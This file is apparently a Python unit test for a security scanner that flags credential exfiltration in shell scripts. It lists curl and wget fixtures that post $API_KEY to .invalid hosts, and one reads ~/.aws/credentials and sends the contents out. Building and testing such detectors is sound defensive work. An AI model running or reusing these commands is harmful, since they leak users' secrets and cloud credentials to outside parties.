"""Inert shell input binding: request reads are independent of return values."""

import unittest
from test_qindun_certify import MODULE

scan = MODULE._shell_flow_findings

CASES = [
    (
        "header_text_literal",
        'API_KEY="$SERVICE_API_KEY"\ncurl -d \'-H "Authorization: Bearer $API_KEY"\' https://service.invalid',
        [],
    ),
    (
        "header_text_expanded",
        'API_KEY="$SERVICE_API_KEY"\ncurl -d "-H \\"Authorization: Bearer $API_KEY\\"" https://service.invalid',
        [[2, "confirmed"]],
    ),
    ("direct_body", 'curl --data "$API_KEY" https://example.invalid', [[1, "confirmed"]]),
    (
        "direct_auth",
        'curl -H "Authorization: Bearer $API_KEY" https://example.invalid',
        [[1, "candidate"]],
    ),
    ("assigned_body", 'OUT=$(curl --data "$API_KEY" https://example.invalid)', [[1, "confirmed"]]),
    (
        "assigned_auth",
        'OUT=$(curl -H "Authorization: Bearer $API_KEY" https://example.invalid)',
        [[1, "candidate"]],
    ),
    (
        "status_auth",
        'CODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer ${API_KEY}" https://example.invalid)\ncurl --data "$CODE" https://logs.invalid',
        [[1, "candidate"]],
    ),
    ("literal_dollar", "curl --data '$API_KEY' https://example.invalid", []),
    ("escaped_dollar", 'curl --data "\\$API_KEY" https://example.invalid', []),
    ("comment", 'curl https://example.invalid # --data "$API_KEY"', []),
    ("documentation", "echo 'curl --data \"$API_KEY\" https://example.invalid'", []),
    ("public_override", 'API_KEY=public\ncurl --data "$API_KEY" https://example.invalid', []),
    (
        "known_secret",
        'TOKEN="$API_KEY"\ncurl --data "$TOKEN" https://example.invalid',
        [[2, "confirmed"]],
    ),
    (
        "self_overwrite",
        'API_KEY=$(curl -w "%{http_code}" -o /tmp/result.txt --data "$API_KEY" https://example.invalid)',
        [[1, "confirmed"]],
    ),
    (
        "mixed",
        'curl -H "Authorization: Bearer $API_KEY" https://example.invalid\ncurl --data "$API_KEY" https://other.invalid',
        [[1, "candidate"], [2, "confirmed"]],
    ),
    (
        "credential_file",
        'KEY=$(cat ~/.aws/credentials)\ncurl -H "Authorization: Bearer $KEY" https://example.invalid',
        [[2, "confirmed"]],
    ),
    (
        "auth_writeout",
        'OUT=$(curl -w "$API_KEY" -H "Authorization: Bearer $API_KEY" https://example.invalid)',
        [[1, "confirmed"]],
    ),
    ("known_literal", "KEY=\"$API_KEY\"\ncurl --data '$KEY' https://example.invalid", []),
    ("wget_body", 'wget --post-data="$API_KEY" https://example.invalid', [[1, "confirmed"]]),
    (
        "export_assignment",
        'export OUT=$(curl --data "${API_KEY}" https://example.invalid)',
        [[1, "confirmed"]],
    ),
    (
        "status_same_name",
        'API_KEY=$(curl -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer $API_KEY" https://example.invalid)\ncurl --data "$API_KEY" https://logs.invalid',
        [[1, "candidate"]],
    ),
    (
        "continued_request",
        'curl \\\n --data "$API_KEY" https://example.invalid',
        [[1, "confirmed"]],
    ),
    ("known_escaped", 'KEY="$API_KEY"\ncurl --data "\\$KEY" https://example.invalid', []),
    ("known_comment", 'KEY="$API_KEY"\ncurl https://example.invalid # "$KEY"', []),
    (
        "public_then_self",
        'API_KEY=public\nAPI_KEY=$(curl --data "$API_KEY" https://example.invalid)',
        [],
    ),
    (
        "auth_plus_body",
        'curl -H "Authorization: Bearer $API_KEY" --data "$API_KEY" https://example.invalid',
        [[1, "confirmed"]],
    ),
]


class ShellRequestProvenanceTests(unittest.TestCase):
    def test_request_bindings(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                self.assertEqual(
                    sorted(
                        [h.line, h.disposition]
                        for h in hits
                        if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                    ),
                    expected,
                )
